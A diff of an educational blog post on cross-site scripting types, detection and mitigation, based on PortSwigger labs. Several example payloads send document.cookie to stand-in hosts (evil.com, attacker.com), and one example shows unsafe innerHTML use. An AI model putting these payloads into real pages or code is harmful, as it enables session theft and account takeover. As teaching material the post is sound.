@@ -1,139 +1,165 @@
 ---
-title: "Cross-Site Scripting (XSS): OWASP Top 10 & Real-World Exploitation"
-date: 2025-07-31
+title: "Understanding Cross-Site Scripting (XSS) - OWASP Top 10 & PortSwigger Labs"
+date: 2025-07-24
 layout: post
-tag: [OWASP, Web Security, XSS]
+tags: [owasp, xss, web-security, portswigger]
 ---
 
-<div style="max-width: 900px; margin: auto; padding: 20px;">
+<div style="background-color: #f9f9f9; padding: 20px; border-left: 5px solid #007acc; border-radius: 6px; margin-bottom: 20px;">
 
-## Table of Contents
+<strong> Table of Contents</strong>
 
-- [What is Cross-Site Scripting (XSS)?](#what-is-cross-site-scripting-xss)
-- [Types of XSS](#types-of-xss)
-  - [1. Stored XSS](#1-stored-xss)
-  - [2. Reflected XSS](#2-reflected-xss)
-  - [3. DOM-Based XSS](#3-dom-based-xss)
-- [How XSS Attacks Work](#how-xss-attacks-work)
-- [Real-World Examples](#real-world-examples)
-- [General Mitigation Strategies](#general-mitigation-strategies)
-- [Conclusion](#conclusion)
-- [References](#references)
+<ul>
+  <li><a href="#introduction">Introduction</a></li>
+  <li><a href="#what-is-xss">What is Cross-Site Scripting (XSS)?</a></li>
+  <li><a href="#why-xss-is-dangerous">Why XSS is Dangerous?</a></li>
+  <li><a href="#1-reflected-xss">1. Reflected XSS</a></li>
+  <li><a href="#2-stored-xss">2. Stored XSS</a></li>
+  <li><a href="#3-dom-based-xss">3. DOM-Based XSS</a></li>
+  <li><a href="#4-self-xss">4. Self XSS</a></li>
+  <li><a href="#detection">Detection Techniques</a></li>
+  <li><a href="#mitigation-and-prevention">Mitigation and Prevention</a></li>
+  <li><a href="#summary">Summary</a></li>
+  <li><a href="#conclusion">Conclusion</a></li>
+  <li><a href="#references">References</a></li>
+</ul>
 
----
+</div>
+
+## Introduction
+
+Cross-Site Scripting (XSS) is one of the most prevalent and dangerous vulnerabilities in modern web applications, listed in the OWASP Top 10. XSS allows attackers to inject malicious JavaScript into web pages viewed by other users. This can lead to stolen cookies, session hijacking, defacement, and even full account takeover.
+
+This blog summarizes what I’ve learned from the **PortSwigger Web Security Academy**, covering different types of XSS, real-world payloads, lab examples, and how to prevent them.
 
 ## What is Cross-Site Scripting (XSS)?
 
-Cross-Site Scripting (XSS) is a client-side code injection vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. When executed in the victim’s browser, these scripts can steal cookies, session tokens, sensitive data, or perform actions on behalf of the user. XSS is included in the [OWASP Top 10](https://owasp.org/Top10) due to its high frequency and impact.
+XSS is a client-side code injection attack that enables attackers to execute malicious scripts in the browser of a victim by injecting them into trusted websites.
 
----
+**Basic payload example:**
 
-## Types of XSS
-
-### 1. Stored XSS
-
-**Definition:**  
-Stored XSS occurs when malicious scripts are permanently saved on the target server (e.g., in a database, comment section, forum post). Any user who accesses the affected page will automatically execute the malicious code.
-
-**How it works:**
-
-1. Attacker submits malicious JavaScript into an input field that gets stored in the application’s database.  
-2. When another user loads the page, the stored script is included in the page’s HTML and executed by the browser.  
-3. The script can perform actions like stealing cookies, keylogging, or redirecting the user to malicious sites.
-
-**Example payload:**
 ```html
-<script>fetch('https://evil.com?cookie=' + document.cookie)</script>
+<script>alert('XSS')</script>
 ```
 
-**Mitigation:**  
-Sanitize and validate all user inputs before storing them; use context-aware output encoding; avoid directly inserting untrusted data into HTML; apply a strict Content Security Policy (CSP).
+If user input isn’t sanitized or escaped properly, this payload can be executed in the victim's browser.
 
----
+## Why XSS is Dangerous?
 
-### 2. Reflected XSS
+- **Stealing session cookies**
+- **Impersonating users**
+- **Performing actions on behalf of others**
+- **Phishing via spoofed login forms**
+- **Defacing websites**
+- **Pivoting into internal systems**
 
-**Definition:**  
-Reflected XSS occurs when malicious scripts are embedded in a URL or request and reflected back to the browser in the server’s response without proper sanitization.
+## 1. Reflected XSS
 
-**How it works:**
+### How it works:
 
-1. Attacker crafts a malicious link containing JavaScript code in a parameter.  
-2. Victim clicks the link and sends a request to the vulnerable application.  
-3. The application reflects the malicious input in its response, which the browser executes.
+Occurs when user input is immediately returned by the server in the HTTP response without proper validation or escaping.
 
-**Example payload in URL:**
+### Example Payload:
+
+```html
+"><script>alert('Reflected XSS')</script>
 ```
-https://example.com/search?q=<script>alert('XSS')</script>
+
+### Example URL:
+
+```
+https://example.com/search?q="><script>alert('XSS')</script>
 ```
 
-**Mitigation:**  
-Sanitize and encode all user inputs before reflecting them in responses; use frameworks that automatically escape output; avoid dynamically generating HTML from untrusted data; implement CSP to block inline scripts.
+<div style="text-align: center;">
+  <img src="/top10-owasp-blog/assets/images/xss-reflected.png" alt="Reflected XSS" style="width: 40%; border: 1px solid #ccc; border-radius: 8px;">
+  <p><em>Figure 1: Reflected XSS attack flow</em></p>
+</div>
 
----
+## 2. Stored XSS
 
-### 3. DOM-Based XSS
+### How it works:
 
-**Definition:**  
-DOM-Based XSS happens when the client-side JavaScript modifies the DOM based on untrusted data without proper sanitization, leading to script execution without any server-side involvement.
+Stored (or persistent) XSS occurs when the malicious script is saved on the server (e.g., in a database) and served to users later.
 
-**How it works:**
+### Example Payload:
 
-1. Attacker crafts a malicious payload that manipulates the page’s DOM via URL fragments, query parameters, or other sources.  
-2. The vulnerable JavaScript code inserts this data directly into the page without escaping.  
-3. The browser executes the malicious code.
+```html
+<script>fetch('https://attacker.com?c='+document.cookie)</script>
+```
 
-**Example vulnerable code:**
+<div style="text-align: center;">
+  <img src="/top10-owasp-blog/assets/images/xss-stored.png" alt="Stored XSS" style="width: 40%; border: 1px solid #ccc; border-radius: 8px;">
+  <p><em>Figure 2: Stored XSS workflow</em></p>
+</div>
+
+## 3. DOM-Based XSS
+
+### How it works:
+
+DOM XSS happens entirely on the client side. The browser-side script uses unsanitized input to modify the DOM, allowing XSS execution.
+
+### Example:
+
 ```javascript
-document.write(location.hash);
+let search = location.hash.substring(1);
+document.getElementById("output").innerHTML = search;
 ```
 
-**Example attack URL:**
+With URL:
+
 ```
-https://example.com/page#<script>alert('XSS')</script>
+https://example.com/#<script>alert('DOM XSS')</script>
 ```
 
-**Mitigation:**  
-Avoid dangerous DOM manipulation methods like `document.write()` and `innerHTML` with untrusted data; use safe DOM APIs like `textContent` or `setAttribute()`; sanitize inputs with trusted libraries (e.g., DOMPurify); implement CSP to prevent execution of injected scripts.
+The script executes in the browser without server involvement.
 
----
+## 4. Self XSS
 
-## How XSS Attacks Work
+### How it works:
 
-1. **Injection:** The attacker injects malicious JavaScript into a vulnerable page.  
-2. **Execution:** The victim’s browser renders the page and runs the script.  
-3. **Impact:** The attacker can steal session cookies, perform actions as the user, or spread malware.
+An attacker convinces users to run a malicious script in their own browser console. It relies on social engineering and does not exploit a server-side vulnerability.
 
----
+### Common Payload:
 
-## Real-World Examples
+```javascript
+javascript:fetch('https://attacker.com?cookie='+document.cookie)
+```
 
-- **MySpace Samy Worm (2005):** A self-replicating XSS worm that spread to over 1 million profiles in 24 hours.  
-- **British Airways Breach (2018):** Malicious JavaScript was injected to steal payment details from thousands of customers.
+## Detection Techniques
 
----
+- Use **Burp Suite** or **ZAP Scanner**
+- Manually test for reflected parameters
+- Inject harmless payloads like `<img src=x onerror=alert(1)>`
+- Review DOM code for unsafe assignments
+- Tools: **Dalfox**, **XSStrike**, **XSS Hunter**
 
-## General Mitigation Strategies
+## Mitigation and Prevention
 
-- Validate and sanitize all user inputs on both client and server.  
-- Use context-specific output encoding.  
-- Enforce a strong Content Security Policy (CSP).  
-- Avoid unsafe JavaScript functions and DOM manipulation methods.  
-- Use security features provided by frameworks.  
-- Regularly test for XSS vulnerabilities using automated scanners and manual penetration testing.
+- **Escape output** according to context (HTML, JavaScript, URL)
+- Use **Content Security Policy (CSP)**
+- Use **frameworks that auto-sanitize** (React, Angular)
+- Set **HTTPOnly** on cookies
+- Use **input validation & output encoding**
+- Disable inline scripts using CSP
+- Avoid `innerHTML`, `document.write()`, `eval()`
 
----
+## Summary
+
+| Type            | Trigger Point      | Data Source     | Severity        |
+|-----------------|--------------------|------------------|-----------------|
+| Reflected XSS   | On URL/request     | Query parameters | Medium          |
+| Stored XSS      | On page load       | Database/content | High            |
+| DOM-Based XSS   | In browser JS      | Fragment/hash    | High            |
+| Self XSS        | User-initiated     | Console input    | Social Engineering |
 
 ## Conclusion
 
-XSS is a critical vulnerability that undermines user trust and can cause severe data breaches. By implementing proper input handling, output encoding, and browser-based security controls, developers can significantly reduce the risk of exploitation.
-
----
+XSS vulnerabilities are still widespread and extremely dangerous. By practicing with **PortSwigger Labs**, I gained hands-on knowledge on how these attacks are crafted and how to defend against them. Developers must always sanitize user input, escape output, and adopt modern frameworks and browser policies to minimize exposure.
 
 ## References
 
-- [OWASP: Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)  
-- [PortSwigger: XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)  
-- [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/)
-
-</div>
+- [PortSwigger Academy: XSS](https://portswigger.net/web-security/cross-site-scripting)
+- [OWASP XSS Guide](https://owasp.org/www-community/xss)
+- [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+- [Google Web Fundamentals: CSP](https://developers.google.com/web/fundamentals/security/csp)
